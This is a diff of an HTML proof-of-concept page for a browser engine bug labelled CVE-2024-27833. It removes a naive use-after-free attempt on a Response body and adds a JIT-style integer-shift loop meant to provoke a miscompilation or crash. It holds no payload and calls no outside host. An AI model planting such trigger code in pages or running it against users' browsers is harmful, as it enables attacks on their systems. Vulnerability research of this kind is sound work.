@@ -1,41 +1,38 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <script>
-        function exploitUAF() {
-            let blob = new Blob([], { type: 'application/octet-stream' });
-            let formData = new FormData();
-            formData.append('emptyBlob', blob);
-
-            let response = new Response(formData);
-            let originalBody = response.body;
-
-            Object.defineProperty(response, 'then', {
-                get: function() {
-                    response = null;
-                    originalBody = null; // تحرير الجسم
-                    if (typeof gc === "function") gc();
-                    return undefined;
-                }
-            });
-
-            response.arrayBuffer().then(() => {
-                try {
-                    // محاولة الوصول بعد التحرير
-                    let test = originalBody; // التحقق من الجسم المحرر
-                    console.log("Accessing locked stream");
-                } catch (e) {
-                    console.error(e.message);
-                    alert(e.message);
-                }
-            }).catch(e => {
-                console.error(e.message);
-                alert(e.message);
-            });
-        }
-    </script>
+    <title>CVE-2024-27833 PoC</title>
 </head>
 <body>
-    <button onclick="exploitUAF()">Exploit UAF</button>
+    <script>
+        function foo(a, b, c) {
+            let x = a | 0;
+            let y = b | 0;
+            let z = c & 15;
+            z = (x << y) ^ (x << (y & 0x10ff));
+            let r = z ^ 0xf01;
+            let s = z ^ 0xf1f;
+            return (((a >>> r) << s) >> s);
+        }
+
+        let LEN = 100000000 - 1;
+        let res = 0;
+        res = foo((LEN & 127), 456, 789);
+
+        if (res != -1) {
+            throw "Wrong result: " + res;
+        }
+
+        for (let i = 0; i <= LEN; i++) {
+            res = foo((i & 127), 456, 789);
+        }
+
+        if (res != -1) {
+            throw "Wrong result: " + res;
+        }
+
+        console.log("PoC executed without immediate crash");
+    </script>
+    <button onclick="location.reload()">Retry</button>
 </body>
 </html>
